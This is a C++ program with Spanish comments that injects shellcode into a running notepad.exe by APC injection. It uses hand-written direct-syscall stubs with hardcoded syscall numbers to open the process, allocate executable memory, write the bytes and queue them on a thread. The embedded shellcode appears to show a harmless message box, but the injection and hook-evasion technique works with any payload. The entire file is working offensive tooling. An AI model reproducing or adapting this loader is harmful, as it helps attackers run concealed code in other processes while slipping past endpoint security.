#include <iostream>
#include <windows.h>
#include <winternl.h>
#include <vector>
#include <tlhelp32.h>
#include <wchar.h>

// Declaraciones de funciones de Syscall (sin cambios)
extern "C" NTSTATUS SysNtOpenProcess(PHANDLE, ACCESS_MASK, POBJECT_ATTRIBUTES, PCLIENT_ID);
extern "C" NTSTATUS SysNtAllocateVirtualMemory(HANDLE, PVOID*, ULONG_PTR, PSIZE_T, ULONG, ULONG);
extern "C" NTSTATUS SysNtWriteVirtualMemory(HANDLE, PVOID, PVOID, ULONG, PULONG);
extern "C" NTSTATUS SysNtQueueAPCThread(HANDLE, PVOID, PVOID, PVOID, PVOID);

// CORRECCIÓN 1: Sintaxis Intel para el ensamblador y syscall de NtWriteVirtualMemory
asm(R"(
    .intel_syntax noprefix
    .global SysNtOpenProcess
    SysNtOpenProcess:
        mov r10, rcx
        mov eax, 0x26
        syscall
        ret
    
    .global SysNtAllocateVirtualMemory
    SysNtAllocateVirtualMemory:
        mov r10, rcx
        mov eax, 0x18
        syscall
        ret
    
    .global SysNtWriteVirtualMemory
    SysNtWriteVirtualMemory:
        mov r10, rcx
        mov eax, 0x19
        syscall
        ret

    .global SysNtQueueAPCThread
    SysNtQueueAPCThread:
        mov r10, rcx
        mov eax, 0x47
        syscall
        ret

    .att_syntax
)");

// Funciones GetProcessIdByName y GetFirstThreadId (sin cambios, ya estaban bien)
DWORD GetProcessIdByName(const wchar_t* processName) {
    PROCESSENTRY32W entry;
    entry.dwSize = sizeof(PROCESSENTRY32W);
    HANDLE snapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (snapshot == INVALID_HANDLE_VALUE) return 0;

    if (Process32FirstW(snapshot, &entry)) {
        while (Process32NextW(snapshot, &entry)) {
            if (_wcsicmp(entry.szExeFile, processName) == 0) {
                CloseHandle(snapshot);
                return entry.th32ProcessID;
            }
        }
    }
    CloseHandle(snapshot);
    return 0;
}

DWORD GetFirstThreadId(DWORD processId){
    THREADENTRY32 entry;
    entry.dwSize = sizeof(THREADENTRY32);
    HANDLE snapshot = CreateToolhelp32Snapshot(TH32CS_SNAPTHREAD, 0);
    if (snapshot == INVALID_HANDLE_VALUE) return 0;

    if (Thread32First(snapshot, &entry)){
        do {
            if (entry.th32OwnerProcessID == processId){
                CloseHandle(snapshot);
                return entry.th32ThreadID;
            }
        } while (Thread32Next(snapshot, &entry));
    }
    
    CloseHandle(snapshot);
    return 0;
}


int main(){
    unsigned char shellcode[] = 
        "\xfc\x48\x81\xe4\xf0\xff\xff\xff\xe8\xd0\x00\x00\x00\x41"
        "\x51\x41\x50\x52\x51\x56\x48\x31\xd2\x65\x48\x8b\x52\x60"
        "\x3e\x48\x8b\x52\x18\x3e\x48\x8b\x52\x20\x3e\x48\x8b\x72"
        "\x50\x3e\x48\x0f\xb7\x4a\x4a\x4d\x31\xc9\x48\x31\xc0\xac"
        "\x3c\x61\x7c\x02\x2c\x20\x41\xc1\xc9\x0d\x41\x01\xc1\xe2"
        "\xed\x52\x41\x51\x3e\x48\x8b\x52\x20\x3e\x8b\x42\x3c\x48"
        "\x01\xd0\x3e\x8b\x80\x88\x00\x00\x00\x48\x85\xc0\x74\x6f"
        "\x48\x01\xd0\x50\x3e\x8b\x48\x18\x3e\x44\x8b\x40\x20\x49"
        "\x01\xd0\xe3\x5c\x48\xff\xc9\x3e\x41\x8b\x34\x88\x48\x01"
        "\xd6\x4d\x31\xc9\x48\x31\xc0\xac\x41\xc1\xc9\x0d\x41\x01"
        "\xc1\x38\xe0\x75\xf1\x3e\x4c\x03\x4c\x24\x08\x45\x39\xd1"
        "\x75\xd6\x58\x3e\x44\x8b\x40\x24\x49\x01\xd0\x66\x3e\x41"
        "\x8b\x0c\x48\x3e\x44\x8b\x40\x1c\x49\x01\xd0\x3e\x41\x8b"
        "\x04\x88\x48\x01\xd0\x41\x58\x41\x58\x5e\x59\x5a\x41\x58"
        "\x41\x59\x41\x5a\x48\x83\xec\x20\x41\x52\xff\xe0\x58\x41"
        "\x59\x5a\x3e\x48\x8b\x12\xe9\x49\xff\xff\xff\x5d\x3e\x48"
        "\x8d\x8d\x18\x01\x00\x00\x41\xba\x4c\x77\x26\x07\xff\xd5"
        "\x49\xc7\xc1\x00\x00\x00\x00\x3e\x48\x8d\x95\x0e\x01\x00"
        "\x00\x3e\x4c\x8d\x85\x13\x01\x00\x00\x48\x31\xc9\x41\xba"
        "\x45\x83\x56\x07\xff\xd5\x48\x31\xc9\x41\xba\xf0\xb5\xa2"
        "\x56\xff\xd5\x48\x6f\x6c\x61\x00\x54\x65\x73\x74\x00\x75"
        "\x73\x65\x72\x33\x32\x2e\x64\x6c\x6c\x00";

    const wchar_t* targetProcessName = L"notepad.exe";
    DWORD pid = GetProcessIdByName(targetProcessName);
    if (pid == 0){
        std::wcerr << L"[-] Proceso '" << targetProcessName << L"' no encontrado" << std::endl;
        return 1;
    }
    std::cout << "[+] Proceso '" << "notepad.exe" << "' Encontrado con PID: " << pid << std::endl;

    HANDLE hProcess = NULL;
    OBJECT_ATTRIBUTES objAttr;
    InitializeObjectAttributes(&objAttr, NULL, 0, NULL, NULL);
    CLIENT_ID client_id = { (HANDLE)(ULONG_PTR)pid, NULL };

    NTSTATUS status = SysNtOpenProcess(&hProcess, PROCESS_ALL_ACCESS, &objAttr, &client_id);
    if (!hProcess || status != 0){
        std::cerr << "[-] Fallo al obtener el handler del proceso. Status: 0x" << std::hex << status << std::endl;
        return 1;
    }
    std::cout << "[+] Handle del proceso obtenido: " << hProcess << std::endl;

    PVOID remoteBuffer = NULL;
    SIZE_T shellcodeSize = sizeof(shellcode);
    status = SysNtAllocateVirtualMemory(hProcess, &remoteBuffer, 0, &shellcodeSize, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
    if (!remoteBuffer || status != 0){
        std::cerr << "[-] Error en la alocacion de memoria. Status: 0x" << std::hex << status << std::endl;
        CloseHandle(hProcess);
        return 1;
    }
    std::cout << "[+] Memoria alojada en: " << remoteBuffer << std::endl;

    // AÑADIDO: Escribir el shellcode en la memoria remota
    ULONG bytesWritten = 0;
    status = SysNtWriteVirtualMemory(hProcess, remoteBuffer, shellcode, sizeof(shellcode), &bytesWritten);
    if (status != 0 || bytesWritten != sizeof(shellcode)) {
        std::cerr << "[-] Fallo al escribir el shellcode. Status: 0x" << std::hex << status << std::endl;
        CloseHandle(hProcess);
        return 1;
    }
    std::cout << "[+] Shellcode escrito exitosamente" << std::endl;

    DWORD tid = GetFirstThreadId(pid);
    if (tid == 0){
        std::cerr << "[-] No se pudo encontrar un hilo" << std::endl;
        CloseHandle(hProcess);
        return 1;
    }
    
    // CORRECCIÓN 2: Usar 'tid' en lugar de 'pid' para OpenThread
    HANDLE hThread = OpenThread(THREAD_SET_CONTEXT, FALSE, tid); 
    if (hThread == NULL){
        std::cerr << "[-] Fallo al obtener el handle del hilo. Error: " << GetLastError() << std::endl;
        CloseHandle(hProcess);
        return 1;
    }
    std::cout << "[+] Handle del hilo obtenido: " << hThread << std::endl;

    status = SysNtQueueAPCThread(hThread, remoteBuffer, NULL, NULL, NULL);
    if (status != 0){
        std::cerr << "[-] Fallo al encolar la APC. Status: 0x" << std::hex << status << std::endl;
        CloseHandle(hProcess);
        CloseHandle(hThread);
        return 1;
    }
    std::cout << "[+] APC encolado, se ejecutara pronto." << std::endl;

    CloseHandle(hProcess);
    CloseHandle(hThread);

    return 0;
}